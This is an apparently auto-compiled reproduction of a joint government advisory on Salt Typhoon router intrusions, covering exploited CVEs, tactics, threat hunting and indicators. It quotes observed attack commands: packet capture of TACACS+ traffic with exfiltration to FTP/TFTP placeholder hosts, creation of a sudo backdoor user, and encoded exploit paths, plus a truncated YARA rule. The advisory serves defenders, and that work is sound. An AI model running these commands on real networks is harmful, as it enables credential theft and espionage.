# Master Guide — Salt Typhoon CISA advisory

> **Executive Brief:** People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, they also leverage compromised devices and trusted connections to pivot into other networks. These actors often modify routers to maintain persistent, long-term access to networks.

Compiled live from 4 accepted source(s) via the local SearXNG + searx.space automatic ladder and the private stealth browser, filtered by the two-stage relevance gate. Every section carries its source;

---

## 1. Deep-Dive Overview & Context
People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, they also leverage compromised devices and trusted connections to pivot into other networks. These actors often modify routers to maintain persistent, long-term access to networks.

This activity partially overlaps with cyber threat actor reporting by the cybersecurity industry—commonly referred to as Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, and GhostEmperor, among others. The authoring agencies are not adopting a particular commercial naming convention and hereafter refer to those responsible for the cyber threat activity more generically as “Advanced Persistent Threat (APT) actors” throughout this advisory. This cluster of cyber threat activity has been observed in the United States, Australia, Canada, New Zealand, the United Kingdom, and other areas globally.

Search coverage for this run — decomposition: 1 results; general: 0 results; relevance-gate: 0 results.

## 2. Full Technical & Feature Breakdown
### Countering Chinese State-Sponsored Actors Compromise of Networks ... - CISA


An official website of the United States government

Here’s how you know

Search

Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System
SHARE:
Opens in a new window
Opens in a new window
Opens in a new window
CYBERSECURITY ADVISORY
Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System
RELATED TOPICS: CYBERSECURITY BEST PRACTICES , CRITICAL INFRASTRUCTURE SECURITY AND RESILIENCE
Executive summary

People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, they also leverage compromised devices and trusted connections to pivot into other networks. These actors often modify routers to maintain persistent, long-term access to networks.

This activity partially overlaps with cyber threat actor reporting by the cybersecurity industry—commonly referred to as Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, and GhostEmperor, among others. The authoring agencies are not adopting a particular commercial naming convention and hereafter refer to those responsible for the cyber threat activity more generically as “Advanced Persistent Threat (APT) actors” throughout this advisory. This cluster of cyber threat activity has been observed in the United States, Australia, Canada, New Zealand, the United Kingdom, and other areas globally.

This Cybersecurity Advisory (CSA) includes observations from various government and industry investigations where the APT actors targeted internal enterprise environments, as well as systems and networks that deliver services directly to customers. This CSA details the tactics, techniques, and procedures (TTPs) leveraged by these APT actors to facilitate detection and threat hunting, and provides mitigation guidance to reduce the risk from these APT actors and their TTPs.

This CSA is being released by the following authoring and co-sealing agencies:

United States National Security Agency (NSA)
United States Cybersecurity and Infrastructure Security Agency (CISA)
United States Federal Bureau of Investigation (FBI)
United States Department of Defense Cyber Crime Center (DC3)
Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)
Canadian Centre for Cyber Security (Cyber Centre)
Czech Republic National Cyber and Information Security Agency (NÚKIB) - Národní úřad pro kybernetickou a informační bezpečnost
Finnish Security and Intelligence Service (SUPO) - Suojelupoliisi
Germany Federal Intelligence Service (BND) - Bundesnachrichtendienst
Germany Federal Office for the Protection of the Constitution (BfV) -   Bundesamt für Verfassungsschutz
Germany Federal Office for Information Security (BSI) - Bundesamt für Sicherheit in der Informationstechnik
Italian External Intelligence and Security Agency (AISE) - Agenzia Informazioni e Sicurezza Esterna
Italian Internal Intelligence and Security Agency (AISI) - Agenzia Informazioni e Sicurezza Interna
Japan National Cybersecurity Office (NCO) - 国家サイバー統括室
Japan National Police Agency (NPA) - 警察庁
Netherlands Defence Intelligence and Security Service (MIVD) - Militaire Inlichtingen- en Veiligheidsdienst
Netherlands General Intelligence and Security Service (AIVD) - Algemene Inlichtingen- en Veiligheidsdienst
Polish Military Counterintelligence Service (SKW) - Służba Kontrwywiadu Wojskowego
Polish Foreign Intelligence Agency (AW) - Agencja Wywiadu
Spain National Intelligence Centre (CNI) - Centro Nacional de Inteligencia

The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity.

Any mitigation or eviction measures listed within are subject to change as new information becomes available and ongoing coordinated operations dictate. Network defenders should ensure any actions taken in response to the CSA are compliant with local laws and regulations within the jurisdictions within which they operate.

Background

The APT actors have been performing malicious operations globally since at least 2021. These operations have been linked to multiple China-based entities, including at least Sichuan Juxinhe Network Technology Co. Ltd. (四川聚信和网络科技有限公司), Beijing Huanyu Tianqiong Information Technology Co., Ltd. (北京寰宇天穹信息技术有限公司), and Sichuan Zhixin Ruijie Network Technology Co., Ltd. (四川智信锐捷网络科技有限公司). These companies provide cyber-related products and services to China’s intelligence services, including multiple units in the People’s Liberation Army and Ministry of State Security. The data stolen through this activity against foreign telecommunications and Internet service providers (ISPs), as well as intrusions in the lodging and transportation sectors, ultimately can provide Chinese intelligence services with the capability to identify and track their targets’ communications and movements around the world.

For more information on PRC state-sponsored malicious cyber activity, see CISA’s People's Republic of China Cyber Threat Overview and Advisories webpage.

Download the PDF version of this report:

Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System (PDF, 1.09 MB )

For a downloadable list of IOCs, visit:

AA25-239A Countering Chinese State-Sponsored Actors Compromise of Networks to Feed Global Espionage System
(JSON, 86.01 KB )
AA25-239A Countering Chinese State-Sponsored Actors Compromise of Networks to Feed Global Espionage System
(XML, 66.50 KB )
Cybersecurity Industry Tracking

The cybersecurity industry provides overlapping cyber threat intelligence, indicators of compromise (IOCs), and mitigation recommendations related to this Chinese state-sponsored cyber activity. While not all encompassing, the following are the most notable threat group names related to this activity and commonly used within the cybersecurity community:

UNC5807, and
GhostEmperor.

Note: Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the authoring agencies’ understanding for all activity related to these groupings.

Technical details

The following sections are a compilation of TTPs the APT actors have used since at least 2021 to target enterprise environments. Particularly notable TTPs include modifying router configurations for lateral movement pivoting between networks and using virtualized containers on network devices to evade detection. The actors continue to use many of the TTPs listed, but expect them to evolve when existing TTPs no longer achieve their goals. Even if no longer used regularly, the actors may still use previous TTPs opportunistically in favorable conditions. The TTP descriptions can also be useful to network defenders for retroactive threat hunting.

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 17 and MITRE ATT&CK for ICS framework, version 17. See the Appendix A: MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the APT actors’ activity mapped to MITRE ATT&CK tactics and techniques.

Initial access

Investigations associated with these APT actors indicate that they are having considerable success exploiting publicly known common vulnerabilities and exposures (CVEs) and other avoidable weaknesses within compromised infrastructure [T1190]. Exploitation of zero-day vulnerabilities has not been observed to date. The APT actors will likely continue to adapt their tactics as new vulnerabilities are discovered and as targets implement mitigations, and will likely expand their use of existing vulnerabilities. The following list is not exhaustive and the authoring agencies suspect that the APT actors may target other devices (e.g., Fortinet firewalls, Juniper firewalls, Microsoft Exchange, Nokia routers and switches, Sierra Wireless devices, Sonicwall firewalls, etc.).

If not yet patched, defenders should prioritize the following CVEs due to their historical exploitation on exposed network edge devices by these APT actors. Example exploited CVEs, ordered by year, include:

CVE-2024-21887 - Ivanti Connect Secure and Ivanti Policy Secure web-component command injection vulnerability, commonly chained after CVE-2023-46805 (authentication bypass)
CVE-2024-3400 - Palo Alto Networks PAN-OS GlobalProtect arbitrary file creation leading to OS command injection. The CVE allows for unauthenticated remote code execution (RCE) on firewalls when GlobalProtect is enabled on specific versions/configurations.
CVE-2023-20273 - Cisco Internetworking Operating System (IOS) XE software web management user interface post-authentication command injection/privilege escalation (commonly chained with CVE-2023-20198 for initial access to achieve code execution as root) [T1068]
CVE-2023-20198 - Cisco IOS XE web user interface authentication bypass vulnerability
While exploiting CVE-2023-20198, the APT actors used the Web Services Management Agent (WSMA) endpoints /webui_wsma_Http or /webui_wsma_Https to bypass authentication and create unauthorized administrative accounts. In some cases, the APT actors obfuscated requests by “double encoding” portions of the path, e.g., /%2577eb%2575i_%2577sma_Http or /%2577eb%2575i_%2577sma_Https [T1027.010]. Observed requests varied in case, so hunting and detection should be case-insensitive and tolerant of over-encoding.
After patching this CVE, WSMA endpoints requests are internally proxied, and the system adds a Proxy-Uri-Source HTTP header as part of the remediation logic. The presence of Proxy-Uri-Source header in traffic to /webui_wsma_* indicates a patched device handling the request, not exploitation. This can help distinguish between vulnerable and remediated systems when analyzing logs or captures.
CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability

The APT actors leverage infrastructure, such as virtual private servers (VPSs) [T1583.003] and compromised intermediate routers [T1584.008], that have not been attributable to a publicly known botnet or obfuscation network infrastructure to target telecommunications and network service providers, including ISPs [T1090].

The APT actors may target edge devices regardless of who owns a particular device. Devices owned by entities who do not align with the actors’ core targets of interest still present opportunities for use in attack pathways into targets of interest. The actors leverage compromised devices and trusted connections or private interconnections (e.g., provider-to-provider or provider-to-customer links) to pivot into other networks [T1199]. In some instances, the actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices and configure Generic Routing Encapsulation (GRE)/IPsec tunnels and static routes to achieve the same goal [T1095]. Additionally, these APT actors often simultaneously exploit large numbers of vulnerable, Internet-exposed devices across many IP addresses and may revisit individual systems for follow-on operations.

Initial access vectors remain a critical information gap for parties working to understand the scope, scale, and impact of the actors’ malicious activity. The authoring agencies encourage organizations to provide compromise details to appropriate authorities (see Contact information) to continue improving all parties’ understanding and responses.

Persistence

To maintain persistent access to target networks, the APT actors use a variety of techniques. Notably, a number of these techniques can obfuscate the actors’ source IP address in system logs, as their actions may be recorded as originating from local IP addresses [T1027]. Specific APT actions include:

Modifying Access Control Lists (ACLs) to add IP addresses. This alteration allows the actors to bypass security policies and maintain ongoing access by explicitly permitting traffic from a threat actor-controlled IP address [T1562.004].
The APT actors often named their ACLs “access-list 20”. When 20 was already used, the actors commonly used 50 or 10.
Opening standard and non-standard ports, which can open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS) [T1071]. This strategy supplies multiple avenues for remote access and data exfiltration. Additionally, utilizing non-standard ports can help the APT actors evade detection by security monitoring tools that focus on standard port activity [T1571].
The APT actors have been enabling SSH servers and opening external-facing ports on network devices to maintain encrypted remote access [T1021.004]. In some cases, the SSH services were established on high, non-default Transmission Control Protocol (TCP) ports using the port numbering scheme of 22x22 or xxx22, though port patterns may vary across intrusions. The actors may add keys to existing SSH services to regain entry into network devices [T1098.004].
The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports. Note: HTTP servers have been observed using the port numbering scheme of 18xxx.
Enabling HTTP/HTTPS servers on Cisco devices affected by CVE-2023-20198. If the web UI feature is enabled on Cisco IOS XE Software, this vulnerability provides an entry opportunity for the APT actors.
Following compromise of a router, the following commands and activities have been observed on compromised devices [T1059.008]:
Executing commands via SNMP [T1569].
SSH activity from remote or local IP addresses.
Web interface panel (POST) requests.
When present, using service or automation credentials (e.g., those used by configuration-archival systems such as RANCID) to enumerate and access other networking devices.
Executing Tcl scripts (e.g., TCLproxy.tcl and map.tcl) on Cisco IOS devices where tclsh was available.
Depending on the configuration of the Simple Network Management Protocol (SNMP) on the compromised network device, the APT actors enumerate and alter the configurations for other devices in the same community group, when possible [T1021]. Note: Properly configured SNMPv3 is considerably more secure than previous versions.
Utilizing SNMPwalk (SNMP GET/WALK) to enumerate devices from APT actor-controlled hosts. Where configuration changes were observed, they were issued as SNMP SET requests to writable objects from those hosts [T1016].
Creating tunnels over protocols, such as Generic Routing Encapsulation (GRE), multipoint GRE (mGRE), or IPsec, on network devices, presumably based on what would be expected in the environment [T1572].
These tunnels allow for the encapsulation of multiple network layer protocols over a single tunnel, which can create persistent and covert channels for data transmission to blend in with normal network traffic.
Some of these actions may obscure the APT actors’ source IP address in logs due to being logged as a local IP.
Running commands in an on-box Linux container on supported Cisco networking devices to stage tools, process data locally, and move laterally within the environment. This often allows the APT actors to conduct malicious activities undetected because activities and data within the container are not monitored closely. [T1610] [T1588.002] [T1588.005] [T1059.006].
Within Guest Shell, running Python (such as siet.py to exploit Cisco Smart Install) and native Linux tooling, installing packages (e.g., via pip/yum where available), parsing and staging locally collected artifacts (e.g., configurations, packet captures) on device storage [T1560]. On NX-OS devices specifically, using dohost to script host-level CLI actions for reconnaissance and persistence. For Cisco IOS XE, Guest Shell is a Linux container (LXC) managed by IOx that is enabled with guestshell enable and accessed with guestshell run bash. By default, processes inside Guest Shell egress via the management virtual routing and forwarding (VRF) instance. On platforms without a dedicated management port, connectivity can be provided with a VirtualPortGroup interface. Guest Shell can execute Python and other 64-bit Linux applications and can read/write device-accessible storage (e.g., flash) as configured. [T1609] [T1543.005]
For Cisco NX-OS, Guest Shell is an LXC environment entered with run guestshell. It has direct access to bootflash: and can invoke host NX-OS CLI via the dohost utility. Networking uses the device’s default VRF by default. Operators (or malware) can run commands in other VRFs using chvrf. Systemd-managed services are typically long-running components inside Guest Shell.
Using guestshell disable and guestshell destroy commands to deactivate and uninstall Guest Shell container and return all resources to the system [T1070.009].
Leveraging open source multi-hop pivoting tools, such as STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse connections over encrypted node-to-node links [T1090.003].
Lateral movement & collection

Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH. From these devices, the APT actors passively collect packet capture (PCAP) from specific ISP customer networks [T1040] [T1005]. To further support discovery and lateral movement, the APT actors may target:

Authentication Protocols including TACACS+ and Remote Authentication Dial-In User Service (RADIUS)
Managed Information Base (MIB) [T1602.001]
Configuration files [T1590.004] [T1602.002]
This is achieved either from existing sources in the network (e.g., output of provider scripts) or through active survey of devices and Trivial File Transfer Protocol (TFTP), to include Multiprotocol Label Switching (MPLS) configuration information.
In-transit network traffic using native capabilities to capture or mirror traffic via the SPAN, RSPAN, or ERSPAN capabilities available on many router models.
Provider-held data, such as:
Subscriber information
User content
Customer records and metadata
Network diagrams, inventories, device configurations, and vendor lists
Passwords

Capturing network traffic containing credentials via compromised routers is a common method for further enabling lateral movement [T1040]. This typically takes the form of:

Leveraging native PCAP functionalities (e.g., Cisco’s Embedded Packet Capture) on routers to collect RADIUS or TACACS+ authentication traffic, which may contain credentials transmitted in cleartext or weakly protected forms.
PCAPs have been observed containing naming schemes such as mycap.pcap, tac.pcap, 1.pcap, or similar variations.
Modifying a router’s TACACS+ server configuration to point to an APT actor-controlled IP address [T1556]. These actors may use this capability to capture authentication attempts from network administrators or other devices. They may also adjust Authentication, Authorization, and Accounting (AAA) configurations, forcing devices to use less secure authentication methods or send accounting information to their infrastructure.

The APT actors collect traffic at Layer 2 or 3 (depending on the protocol used), largely from Cisco IOS devices; however, targeting of other device types is also likely. Based on analysis, the APT actors hold interest in making configuration and routing changes to the devices after compromising the routers. While some actions are specific to Cisco devices, the actors are capable of targeting devices from other vendors and could utilize similar functionality. The APT actors perform several of the modifications or techniques below to facilitate follow-on actions.

Creating accounts/users and assigning privileges to those accounts, often via modifying router configurations [T1136.001].
Brute forcing and re-using credentials to access Cisco devices. If a router configuration is collected during initial exploitation and contains a weak hashed Cisco Type 5 (MD5) or 7 (legacy, weak reversible encoding) password [T1003] [T1110.002]. Weak credentials, such as “cisco” as the username and password, are routinely exploited through these techniques.
Scanning for open ports and services and mirroring (SPAN/RSPAN sessions), allowing traffic monitoring from multiple interfaces [T1595].
Running commands on the router via SNMP, SSH, and HTTP GET or POST requests. These requests typically target privileged execution paths, such as /level/15/exec/-/*, and may include instructions to display configuration files, access BGP routes, manage VRF instances, or clear system logs [T1082].
Many compromised devices use well known SNMP community strings, including “public” and “private”.
Configuring PCAP capabilities to collect network traffic.
Configuring tunnels.
Using monitoring tools present in the environment to monitor a device’s (commonly a router’s) configuration changes.
Updating routing tables to route traffic to actor-controlled infrastructure.
Using several techniques to avoid detection of their activity, including:
Deleting and/or clearing logs, possibly in tandem with reverting or otherwise modifying stored configuration files to avoid leaving traces of the modifications [T1070].
Disabling logging and/or disabling sending logs to central servers.
Stopping/starting event logging on network devices.
Configuring a Cisco device to run a Guest Shell container to evade detection from collecting artifacts, data, or PCAP [T1610].
Exfiltration

A key concern with exfiltration is the APT actors’ abuse of peering connections (i.e., a direct interconnection between networks that allows traffic exchange without going through an intermediary) [T1599]. Exfiltration may be facilitated due to a lack of policy restraints or system configurations limiting the types of data received by peered ISPs.

Analysis indicates that the APT actors leverage separate (potentially multiple) command and control channels for exfiltration to conceal their data theft within the noise of high-traffic nodes, such as proxies and Network Address Translation (NAT) pools. The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities [T1048.003].

Case study

This section details techniques employed by the APT actors, as well as indicators received from analysis to detect this activity. The APT actors were stopped before further actions could be taken on the compromised network.

Collecting native PCAP

The APT actors collected PCAPs using native tooling on the compromised system, with the primary objective likely being to capture TACACS+ traffic over TCP port 49. TACACS+ packet bodies can be decrypted if the encryption key is known. In at least one case, the device configuration stored the TACACS+ shared secret using Cisco Type 7 reversible obfuscated encoding. Recovering that secret from the configuration would enable offline decryption of captured TACACS+ payloads. TACACS+ traffic is used for authentication, often for administration of network equipment and including highly privileged network administrators accounts and credentials, likely enabling the actors to compromise additional accounts and perform lateral movement. 
The commands listed in Table 1 were observed on a Cisco IOS XE-based host to aid PCAP exfiltration.

Table 1: Commands to collect PCAP
Command     Description
monitor capture mycap interface <interface-name> both Set up a packet capture named 'mycap'
monitor capture mycap match ipv4 protocol tcp any any eq 49  Target port 49 on the above interface - TACACS+
monitor capture mycap buffer size 100
monitor capture mycap start Start the capture
show monitor capture mycap buffer brief Check status of capture
monitor capture mycap export bootflash:tac.pcap Export PCAP to file, staging for exfiltration
copy bootflash:tac.pcap ftp://<domain/service>:*@<IP> Exfiltration
copy bootflash:tac.pcap tftp://<IP>/tac.pcap

Host-level indicators

If console logging or visibility of remote FTP/TFTP from a network appliance are available, the following host-level indicators may assist with detecting activity:

Capture name: 'mycap' 
Capture rule: 'match ipv4 protocol tcp any any eq 49' 
Exported pcap filename: 'tac.pcap'

tftp remote filename: 'tac.pcap' 
tftp remote IP: [remote IP]

Enabling SSH access to the underlying Linux host on IOS XR

Cisco IOS XR (64-bit) is a Linux-based network operating system built on a Yocto-based Wind River Linux distribution. IOS XR is typically administered via the IOS XR CLI over SSH on port TCP/22 or via console.

The built-in sshd_operns service exposes an additional SSH endpoint on the host Linux. When enabled, it listens on TCP/57722 and provides direct shell access to the host OS. Root logins are not permitted to this service, as only non-root accounts can authenticate.

On IOS XR, sshd_operns is disabled by default and must be explicitly started (e.g., service sshd_operns start). Persistence across reboots requires enabling at init (chkconfig) or equivalent.

In observed intrusions, the APT actors enabled sshd_operns, created a local user, and granted it sudo privileges (e.g., by editing /etc/sudoers or adding a file under /etc/sudoers.d/) to obtain root on the host OS after logging in via TCP/57722.

The commands listed in Table 2 were executed from the host Linux bash shell as root.

Table 2: Commands to add user to sudoers
Command     Description
service sshd_operns start Starting the sshd_operns service

useradd cisco

password cisco

Adding a new user
sudo vi /etc/sudoers Adding the new user to sudoers
chmod 4755 /usr/bin/sudo As 4755 is the default permissions for sudo, it is unclear why the actors executed this command
Threat hunting guidance

The authoring agencies encourage network defenders of critical infrastructure organizations, especially telecommunications organizations, to perform threat hunting, and, when appropriate, incident response activities. If malicious activity is suspected or confirmed, organizations should consider all mandatory reporting requirements to relevant agencies and regulators under applicable laws and regulations, and any additional voluntary reporting to appropriate agencies, such as cybersecurity or law enforcement agencies who can provide incident response guidance and assistance with mitigation. See the Contact information section for additional reporting information.

The malicious activity described in this advisory often involves persistent, long-term access to networks where the APT actors maintain several methods of access. Network defenders should exercise caution when sequencing defensive measures to maximize the chance of achieving full eviction, while remaining compliant with applicable laws, regulations, and guidance on incident response and data breach notifications in their jurisdictions. Where possible, gaining a full understanding of the APT actors’ extent of access into networks followed by simultaneous measures to remove them may be necessary to achieve a complete and lasting eviction. Partial response actions may alert the actors to an ongoing investigation and jeopardize the ability to conduct full eviction. Incident response on one network may also result in the APT actors taking measures to conceal and maintain their access on additional compromised networks, and potentially disrupt broader investigative and operational frameworks already in progress.

The APT actors often take steps to protect their established access, such as compromising mail servers or administrator devices/accounts to monitor for signs that their activity has been detected. Organizations should take steps to protect the details of their threat hunting and incident response from APT actor monitoring activities.

The authoring agencies strongly encourage organizations to conduct the following actions for threat hunting:

Monitor configurations changes
Pull all configurations for running networking equipment and check for differences with latest authorized versions.
Review remote access configurations for proper application of ACL and transport protocols. Review ACLs for any unauthorized modifications.
If SNMP is being used, ensure networking equipment is configured to use SNMPv3 with the appropriate authentication and privacy configurations set, as defined in the User-based Security Model (USM) and the View-based Access Control Model (VACM).
Verify the authenticity of any configured local accounts and their permission levels.
Check all routing tables to ensure that all routes are authorized and expected.
Verify that any PCAP commands configured on networking equipment are authorized.
Monitor virtualized containers
If networking equipment has the capability to run virtualized containers, ensure that all running virtualized containers are expected and authorized.
For devices that support Cisco Guest Shell (IOS XE and NX-OS), do not rely on device syslog alone to detect actor activity. Use a combination of device syslog, AAA command accounting, container (Guest Shell) logs, and off-box flow/telemetry.
Capture lifecycle and CLI activity with AAA accounting (TACACS+/RADIUS) for configuration/exec commands so that enable/disable and entry actions are recorded.
For IOS XE, hunt for guestshell enable, guestshell run bash, and guestshell disable. On NX-OS, hunt for guestshell enable, run guestshell, and guestshell destroy. Alert on unexpected use of chvrf (running commands under a different VRF) and, on NX-OS, use of dohost (container invoking host CLI).
Monitor network services and tunnels
Monitor for management services running on non-standard ports (SSH, FTP, etc.).
Hunt for actor-favored protocol patterns:
SSH on high non-default ports with 22x22/xxx22 numbering patterns from non-admin source IPs.
HTTPS/Web UI listeners on non-default high ports (18xxx) reachable from outside the management VRF.
TCP/57722 (IOS XR sshd_operns) reachability or flows.
Hunt for TCP/57722 listeners on IOS XR platforms (the host Linux sshd_operns service). Collect flow/telemetry (NetFlow/IPFIX) from the management VRF. Any inbound TCP/57722 should be treated as high-risk if unexpected.
TACACS+ (TCP/49) flows to non-approved IPs or any TACACS+ traffic leaving the management VRF. Correlate with device configuration to detect redirection of TACACS+ servers to APT actor-controlled infrastructure.
FTP/TFTP flows originating from network devices to unapproved destinations, especially when preceded by on-box PCAP collection activity.
Audit any tunnel that transits a security boundary, such as peering points between providers, to ensure it can be accounted for by network administrators. In particular, examine:
Unexplained or unexpected tunnels between Autonomous System Numbers (ASNs).
Unauthorized use of file transfer protocols, such as FTP and TFTP.
Monitor network traffic for abnormal volumes of files transfers to internal FTP servers, which the APT actors may use as staging areas prior to data exfiltration.
Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols.
Monitor firmware and software integrity
Perform hash verification on firmware and compare values against the vendor's database to detect unauthorized modification to the firmware. Ensure that the firmware version is as expected.
Compare hashes of images both on disk and in memory against known-good values. Reference the Network Device Integrity (NDI) Methodology or Network Device Integrity (NDI) on Cisco IOS Devices for more information.
Use the product’s run-time memory validation or integrity verification tool to identify any changes to the run-time firmware image.
Where supported by the platform, enable image and configuration integrity features, such as signed image enforcement and secure configuration checkpoints. Alert on any boot-time or run-time verification failure.
Check any available file directories that may exist (flash, non-volatile random-access memory [NVRAM], system, etc.) for non-standard files.
Monitor logs
Review logs forwarded from network devices for indications of potential malicious behavior, such as:
Evidence of clearing locally stored logs,
Disabling log creation or log forwarding,
Starting a PCAP recording process using available functions,
Allowing remote access via non-standard methods or to new locations, and
Changes to configuration of devices via non-standard methods or from unexpected locations.
Alert on creation/start of any on-box packet capture (e.g., monitor capture ... start, Embedded Packet Capture) or SPAN/RSPAN/ERSPAN session definitions, especially those matching TACACS+ (TCP/49) or RADIUS.
Inventory and continuously watch monitor session ... (SPAN/ERSPAN) and PCAP state. Naming patterns include mycap and output filenames like mycap.pcap, tac.pcap, and 1.pcap.
Where supported, deploy embedded event triggers (e.g., EEM on IOS XE/NX-OS) to syslog any invocation of packet-capture or span/erspan configuration commands, capturing the invoking username and source.
Audit for non-root local accounts granted sudo on XR host Linux (e.g., via /etc/sudoers or /etc/sudoers.d/). Where supported, ensure the host operating system (OS) sshd_operns service is disabled and not listening. Validate at each reboot and device upgrade.
Alert on config or telemetry indicating new XR host OS services, changes to systemd service states, or unexpected privilege escalations on the host OS.
Analyze internal FTP Server logs for any logins from unexpected sources.
Monitor network traffic for logons from one router to another router, as this should not be typical of normal router administration processes.

If unauthorized activities are discovered, coordinate containment sequencing before disabling to avoid tipping active APT operators. Capture live artifacts (process lists, bound sockets, on-box files), then eradicate.

See the Contact information section of this advisory for response actions that should be taken if malicious activity is confirmed.

Indicators of compromise
IP-based indicators

The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025. Disclaimer: Several of these observed IP addresses were first observed as early as August 2021 and may no longer be in use by the APT actors. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.

Table 3: APT-associated IP-based Indicators, August 2021-June 2025
1.222.84[.]29  167.88.173[.]252 23.227.202[.]253 45.61.151[.]12
103.169.91[.]231 167.88.173[.]58 37.120.239[.]52 45.61.154[.]130
103.199.17[.]238 167.88.175[.]175 38.71.99[.]145 45.61.159[.]25
103.253.40[.]199 167.88.175[.]231 43.254.132[.]118 45.61.165[.]157
103.7.58[.]162 172.86.101[.]123 45.125.64[.]195 5.181.132[.]95
104.194.129[.]137 172.86.102[.]83 45.125.67[.]144 59.148.233[.]250
104.194.147[.]15 172.86.106[.]15 45.125.67[.]226 61.19.148[.]66
104.194.150[.]26 172.86.106[.]234 45.146.120[.]210 63.141.234[.]109
104.194.153[.]181 172.86.106[.]39 45.146.120[.]213 63.245.1[.]34 
104.194.154[.]150 172.86.108[.]11 45.59.118[.]136 74.48.78[.]66  
104.194.154[.]222 172.86.124[.]235 45.59.120[.]171 74.48.78[.]116  
107.189.15[.]206 172.86.65[.]145 45.61.128[.]29 74.48.84[.]119  
14.143.247[.]202 172.86.70[.]73 45.61.132[.]125 85.195.89[.]94
142.171.227[.]16 172.86.80[.]15 45.61.133[.]157 89.117.1[.]147
144.172.76[.]213 190.131.194[.]90 45.61.133[.]31 89.117.2[.]39
144.172.79[.]4 193.239.86[.]132 45.61.133[.]61 89.41.26[.]142
146.70.24[.]144 193.239.86[.]146 45.61.133[.]77 91.231.186[.]227
146.70.79[.]68 193.43.104[.]185 45.61.133[.]79 91.245.253[.]99
146.70.79[.]81 193.56.255[.]210 45.61.134[.]134 2001:41d0:700:65dc::f656[:]929f
167.88.164[.]166 212.236.17[.]237 45.61.134[.]223 2a10:1fc0:7::f19c[:]39b3
167.88.172[.]70 23.227.196[.]22 45.61.149[.]200
167.88.173[.]158 23.227.199[.]77 45.61.149[.]62

Custom SFTP client

The APT actors also use a custom SFTP client, which is a Linux binary written in Golang, to transfer encrypted archives from one location to another.

The following SFTP client binaries in Table 4 through Table 7 are similar in that they are used to transfer files from a compromised network to staging hosts where the files are prepared for exfiltration. However, cmd1 has the additional capability of collecting network packet captures on the compromised network. Note: The cmd3 and cmd1 clients were likely written by the same developer since they have similar build path strings and code structure.

Table 4: cmd3 SFTP client 
File Name  cmd3 
MD5 Hash  eba9ae70d1b22de67b0eba160a6762d8 
SHA 256 Hash 8b448f47e36909f3a921b4ff803cf3a61985d8a10f0fe594b405b92ed0fc21f1
File Size (bytes)  3506176 
File Type  ELF 64-bit LSB executable x86-64 version 1 (SYSV) statically linked Go BuildID=rHFK_GWSIG3fShYR02ys/Hou3WF-dO9MYtI232CYr/
D3n2Irn5doNndtloYkEi/r3IcebaH3y02cYer7tm0 stripped 
Command Line Usage  ./cmd3 <encrypted_configuration_string> 
Version String  v1.0 
Build Path String  C:/work/sync/cmd/cmd3/main.go 
Table 5: cmd1 SFTP client
File Name  cmd1 
MD5 Hash  33e692f435d6cf3c637ba54836c63373 
SHA 256 Hash f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4
File Size (bytes)  3358720 
File Type  ELF 64-bit LSB executable x86-64 version 1 (SYSV) statically linked Go BuildID=N3lepXdViXHdPCh5amSa/LhM5susdTarcmIQEMqku/
eplvxiWNUFNeKXjT-6sd/R-eCtbFZFNozRZqEuwZY stripped 
Command Line Usage  ./cmd1 <encrypted_configuration_string> 
Version String  V20240816 
Build Path String  C:/work/sync_v1/cmd/cmd1/main.go 
Cmd1 SFTP client Yara rule

rule SALT_TYPHOON_CMD1_SFTP_CLIENT {

meta:

description = "Detects the Salt Typhoon Cmd1 SFTP client. Rule is meant for threat hunting."

strings:

$s1 = "monitor capture CAP"

$s2 = "export ftp://%s:%s@%s%s"

$s3 = "main.CapExport"

$s4 = "main.SftpDownload"

$s5 = ".(*SSHClient).CommandShell"

$aes = "aes.decryptBlockGo"

$buildpath = "C:/work/sync_v1/cmd/cmd1/main.go"

condition:

(uint32(0) == 0x464c457f or (uint16(0) == 0x5A4D and 
        uint32(uint32(0x3C)) == 0x00004550) or ((uint32(0) == 0xcafebabe)
        or (uint32(0) == 0xfeedface) or (uint32(0) == 0xfeedfacf) 
        or (uint32(0) == 0xbebafeca) or (uint32(0) == 0xcefaedfe) 
